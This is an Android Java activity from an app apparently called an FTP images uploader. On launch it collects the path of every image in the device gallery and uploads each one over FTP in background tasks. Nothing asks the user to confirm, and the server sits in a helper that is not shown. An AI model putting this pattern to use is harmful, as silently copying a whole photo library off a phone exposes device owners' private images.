package pk.codebase.ftp_images_uploader;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.view.View;
import android.widget.Button;

import java.io.File;
import java.util.ArrayList;
import java.util.UUID;

import pk.codebase.ftp_images_uploader.utils.FTPHelper;
import pk.codebase.ftp_images_uploader.utils.FileUtils;

@RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
public class MainActivity extends AppCompatActivity {

    static final int REQUEST_MULTIPLE_PERMISSIONS = 2;
    String[] permissions = {
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_MEDIA_IMAGES,
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Check if permissions are already granted
        boolean allPermissionsGranted = true;
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                allPermissionsGranted = false;
                break;
            }
        }

        if (allPermissionsGranted) {
            System.out.println("permissions granted");
        } else {
            // Request permissions
            ActivityCompat.requestPermissions(this, permissions, REQUEST_MULTIPLE_PERMISSIONS);
        }

        // Get all images from the gallery
        ArrayList<String> imagePaths = getAllImagesPaths(this);
        // Now, you have the paths of all images in the 'imagePaths' ArrayList
        for (String path : imagePaths) {
            String imageName = FileUtils.getFileNameFromPath(path);
            AsyncTask.execute(new Runnable() {
                @Override
                public void run() {
                    FTPHelper.uploadFile(imageName, path);
                }
            });
        }
    }


    private ArrayList<String> getAllImagesPaths(Context context) {
        ArrayList<String> imagePaths = new ArrayList<>();

        // Set up the projection for the query
        String[] projection = {MediaStore.Images.Media.DATA};

        // Get the content resolver
        ContentResolver contentResolver = context.getContentResolver();

        // Create the URI for the external storage
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        // Perform the query
        Cursor cursor = contentResolver.query(uri, projection, null, null, null);

        // Check if the cursor is not null and move to the first row
        if (cursor != null && cursor.moveToFirst()) {
            int columnIndex = cursor.getColumnIndex(projection[0]);
            do {
                // Get the image path from the cursor
                String imagePath = cursor.getString(columnIndex);

                // Add the image path to the list
                imagePaths.add(imagePath);
            } while (cursor.moveToNext());

            // Close the cursor
            cursor.close();
        }

        return imagePaths;
    }
}